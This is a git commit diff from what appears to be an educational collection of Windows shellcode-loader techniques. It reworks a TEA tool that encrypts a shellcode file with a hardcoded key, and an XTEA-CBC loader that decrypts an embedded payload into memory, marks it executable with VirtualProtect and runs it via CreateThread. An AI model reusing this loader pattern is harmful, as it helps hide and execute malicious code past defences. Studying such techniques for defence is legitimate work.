20c4d26f514048723e851619b3f81beb4d772bc1
Satria ady Pradana <xathrya@reversing.id>
2025-01-11 14:26:23 +0700

    rewrite TEA and XTEA to follow code pattern

--- windows/writing/encryption/block/tea/c++/generator.cpp
+++ windows/writing/encryption/block/tea/c++/generator.cpp
@@ -12,15 +12,58 @@ Note:
 #include <windows.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <time.h>
 
-void block_encrypt (uint32_t val[2], uint32_t key[4])
+
+#define BLOCKSIZEB      8
+#define ROUNDS          32
+
+#ifdef _MSC_VER
+    #pragma intrinsic(_lrotr,_lrotl)
+    #define rotr(x,n)   _lrotr(x,n)
+    #define rotl(x,n)   _lrotl(x,n)
+#else 
+    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
+    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
+#endif
+
+#define bswap32(x)      (rotl(x,8) & 0x00FF00FF | rotr(x, 8) & 0xFF00FF00)
+
+/* *************************** HELPER FUNCTIONS *************************** */
+/* XOR 2 block data */
+void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
 {
-    uint32_t v0 = val[0], v1 = val[1];
-    uint32_t k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3];
-    uint32_t delta = 0x9E3779B9, sum = 0, i;
+    register uint32_t i = 0;
+    for (i = 0; i < BLOCKSIZEB; i++)
+        dst[i] = src1[i] ^ src2[i];
+}
+
+void print_hex(char* header, uint8_t* data, uint32_t length)
+{
+    printf("%s = {", header);
+    for (int idx = 0; idx < length; idx++)
+    {
+        if (idx % 16 == 0)
+            printf("\n  ");
+    
+        printf("0x%02x, ", data[idx]);
+    }
+    printf("\n}\n");
+    printf("Length: %d\n", length);
+}
+
+void block_encrypt (uint8_t * val, uint8_t * key)
+{
+    uint32_t  * p_val = (uint32_t*)val;
+    uint32_t  * p_key = (uint32_t*)key;
+
+    uint32_t    v0 = bswap32(p_val[0]), v1 = bswap32(p_val[1]);
+    uint32_t    k0 = bswap32(p_key[0]), k1 = bswap32(p_key[1]), 
+                k2 = bswap32(p_key[2]), k3 = bswap32(p_key[3]);
+    uint32_t    delta = 0x9E3779B9, sum = 0, i;
 
     // Round: 32
-    for (i =  0; i < 32; i++)
+    for (i =  0; i < ROUNDS; i++)
     {
         // Round-Function
         sum += delta;
@@ -28,77 +71,72 @@ void block_encrypt (uint32_t val[2], uint32_t key[4])
         v1  += ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
     }
 
-    val[0] = v0;
-    val[1] = v1;
+    p_val[0] = bswap32(v0);
+    p_val[1] = bswap32(v1);
 }
 
-void encrypt (uint32_t * data, uint32_t block_count, uint32_t key[4], uint32_t iv[2])
+void encrypt (uint8_t * data, uint32_t length, uint8_t * key, uint8_t * iv)
 {
-    uint32_t i;
-    uint32_t prev_block[2];
+    uint32_t   i;
+    uint8_t  * prev_block = iv;
 
-    prev_block[0] = iv[0];
-    prev_block[1] = iv[1];
-
-    for (i = 0; i < block_count; i += 2)
+    for (i = 0; i < length; i += BLOCKSIZEB)
     {
-        // XOR plaintext block with previous ciphertext block
-        data[i    ] ^= prev_block[0];
-        data[i + 1] ^= prev_block[1];
+        // XOR block plaintext dengan block ciphertext sebelumnya
+        xor_block(&data[i], &data[i], prev_block);
 
-        // encrypt plaintext to ciphertext
+        // Enkripsi plaintext menjadi ciphertext
         block_encrypt(&data[i], key);
 
-        // store ciphertext block for next operation
-        prev_block[0] = data[i    ];
-        prev_block[1] = data[i + 1];
+        // Simpan block ciphertext untuk operasi XOR selanjutnya
+        prev_block = &data[i];
     }
 }
-
 
 int main()
 {
     HANDLE  f;
-    SIZE_T  payload_len;
+    SIZE_T  payload_len, alloc_size, remainder;
     DWORD   nread;
 
-    uint8_t  *  payload;
-    uint32_t    idx, nitem = 0;
-    SIZE_T      remainder, multiple = 8;    // 2x 4-byte 
+    uint8_t * payload;
 
-                    //    R E V E     R S I N     G . I D     1 3 3 7
-    uint32_t key[4] = { 0x52455645, 0x5253494E, 0x472E4944, 0x31333337 };
-    uint32_t iv[2]  = { 0x13510030, 0x13510030 };
+    // static key because the key is awesome
+    uint8_t   key[] = 
+            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
+    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
+              0x31, 0x33, 0x33, 0x37 };
+            /*  1     3     3     7  */
+    
+    // generate IV, this example is not cryptographically secure
+    uint8_t   iv[BLOCKSIZEB];
+
+    srand(time(0));
+    for (int i = 0; i < BLOCKSIZEB; i++)
+        iv[i] = rand() % 0xFF; 
 
     // open existing file
     f = CreateFile ("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
     // query the size and create enough space in heap
     payload_len = GetFileSize (f, NULL);
-    remainder   = payload_len % multiple;
-    if (remainder)
-        payload_len += (multiple - remainder);
-    nitem = 2 * payload_len / multiple;
+    remainder   = payload_len % BLOCKSIZEB;
+    alloc_size  = payload_len + (remainder ? BLOCKSIZEB - remainder : 0);
 
-    payload = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len);
+    // add space for IV
+    payload = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, payload_len + BLOCKSIZEB);
 
     // read the shellcode
+    memset(payload, 0x90, alloc_size);
     ReadFile(f, payload, payload_len, &nread, NULL);
 
     // encrypt data, 
-    encrypt ((uint32_t*)payload, nitem, key, iv);
+    memcpy (&payload[alloc_size], iv, BLOCKSIZEB);
+    encrypt (payload, alloc_size, key, iv);
 
     // print
-    printf("{");
-    for (idx = 0; idx < payload_len; idx++)
-    {
-        if (idx % 16 == 0)
-            printf("\n  ");
-        
-        printf("0x%02x, ", payload[idx]);
-    }
-    printf("\n}\n");
-    printf ("Length: %lld\n", payload_len);
+    print_hex("IV", iv, BLOCKSIZEB);
+    print_hex("Payload", payload, alloc_size + BLOCKSIZEB);
 
     // destroy heap
     HeapFree (GetProcessHeap(), 0, payload);
--- windows/writing/encryption/block/xtea/c++/code.cpp
+++ windows/writing/encryption/block/xtea/c++/code.cpp
@@ -12,20 +12,52 @@ Technique:
     - writing:    XTEA with CBC mode
     - permission: VirtualProtect
     - execution:  CreateThread
+
+Reference:
+    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/XTEA/code.c
 */
 
 #include <windows.h>
 #include <stdint.h>
 #include <stdlib.h>
 
-void block_decrypt (uint32_t val[2], uint32_t key[4])
+
+#define BLOCKSIZEB      8
+#define ROUNDS          32
+
+#ifdef _MSC_VER
+    #pragma intrinsic(_lrotr,_lrotl)
+    #define rotr(x,n)   _lrotr(x,n)
+    #define rotl(x,n)   _lrotl(x,n)
+#else 
+    #define rotr(x,n)   (((x) >> ((int)(n))) | ((x) << (32 - (int)(n))))
+    #define rotl(x,n)   (((x) << ((int)(n))) | ((x) >> (32 - (int)(n))))
+#endif
+
+#define bswap32(x)      (rotl(x,8) & 0x00FF00FF | rotr(x, 8) & 0xFF00FF00)
+
+
+/* *************************** HELPER FUNCTIONS *************************** */
+void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
 {
-    uint32_t v0 = val[0], v1 = val[1];
-    uint32_t k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3];
-    uint32_t delta = 0x9E3779B9, sum = 0xC6EF3720, i;
+    register uint32_t i = 0;
+    for (i = 0; i < BLOCKSIZEB; i++)
+        dst[i] = src1[i] ^ src2[i];
+}
+
+
+void block_decrypt (uint8_t * val, uint8_t * key)
+{
+    uint32_t  * p_val = (uint32_t*)val;
+    uint32_t  * p_key = (uint32_t*)key;
+
+    uint32_t    v0 = bswap32(p_val[0]), v1 = bswap32(p_val[1]);
+    uint32_t    k0 = bswap32(p_key[0]), k1 = bswap32(p_key[1]), 
+                k2 = bswap32(p_key[2]), k3 = bswap32(p_key[3]);
+    uint32_t    delta = 0x9E3779B9, sum = 0xC6EF3720, i;
 
     // Round: 32
-    for (i =  0; i < 32; i++)
+    for (i =  0; i < ROUNDS; i++)
     {
         // Inverse Round-Function
         v1  -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
@@ -33,35 +65,32 @@ void block_decrypt (uint32_t val[2], uint32_t key[4])
         sum -= delta;
     }
 
-    val[0] = v0;
-    val[1] = v1;
+    p_val[0] = bswap32(v0);
+    p_val[1] = bswap32(v1);
 }
 
-void decrypt (uint32_t * data, uint32_t block_count, uint32_t key[4], uint32_t iv[2])
+void decrypt (uint8_t * data, uint32_t length, uint8_t * key, uint8_t * iv)
 {
-    uint32_t i;
-    uint32_t prev_block[2];
-    uint32_t cipher_block[2];
+    uint32_t   i;
+    uint8_t    prev_block[BLOCKSIZEB];
+    uint8_t    ctext_block[BLOCKSIZEB];
 
-    // cipher block which will be XORed
-    prev_block[0] = iv[0];
-    prev_block[1] = iv[1];
+    memcpy(prev_block, iv, BLOCKSIZEB);
 
-    for (i = 0; i < block_count; i += 2)
+    for (i = 0; i < length; i += BLOCKSIZEB)
     {
-        // store ciphertext for next XOR operation.
-        cipher_block[0] = data[i    ];
-        cipher_block[1] = data[i + 1];
+        // Simpan block ciphertext untuk operasi XOR berikutnya.
+        memcpy(ctext_block, &data[i], BLOCKSIZEB);
 
-        // decrypt ciphertext to plaintext
+        // Dekripsi ciphertext menjadi block
         block_decrypt(&data[i], key);
 
-        // XOR ciphertext with previous block
-        data[i    ] ^= prev_block[0];
-        data[i + 1] ^= prev_block[1];
+        // XOR block block dengan block ciphertext sebelumnya
+        // gunakan IV bila ini adalah block pertama
+        xor_block(&data[i], &data[i], prev_block);
 
-        prev_block[0] = cipher_block[0];
-        prev_block[1] = cipher_block[1];
+        // Pindahkan block ciphertext yang telah disimpan
+        memcpy(prev_block, ctext_block, BLOCKSIZEB);
     }
 }
 
@@ -74,20 +103,26 @@ int main ()
     DWORD   old_protect = 0;
 
     // shellcode storage in stack
-    uint8_t     payload []  = { 0x5c, 0xbc, 0x86, 0x02, 0xae, 0xb9, 0xf4, 0xb3 };
+    uint8_t     payload []  = { 
+        0xd2, 0x8a, 0x6c, 0x7e, 0x04, 0x06, 0xd5, 0x86, 
+        0xd7, 0xbb, 0x01, 0x1d, 0x11, 0x83, 0x8c, 0xac 
+    };
     uint32_t    payload_len = 8;
-    uint32_t    idx;
+    uint8_t   * iv = &payload[payload_len];
 
-                    //    R E V E     R S I N     G . I D     1 3 3 7
-    uint32_t key[4] = { 0x52455645, 0x5253494E, 0x472E4944, 0x31333337 };
-    uint32_t iv[2]  = { 0x13510030, 0x13510030 };
+    // secret-key
+    uint8_t     key[] = 
+            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
+    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
+              0x31, 0x33, 0x33, 0x37 };
+            /*  1     3     3     7  */
 
     // allocate memory buffer for payload as READ-WRITE (no executable)
     runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     // decrypt data
     RtlMoveMemory (runtime, payload, payload_len);
-    decrypt ((uint32_t*)runtime, payload_len/4, key, iv);
+    decrypt ((uint8_t*)runtime, payload_len, key, iv);
     
     // make buffer executable (R-X)
     retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
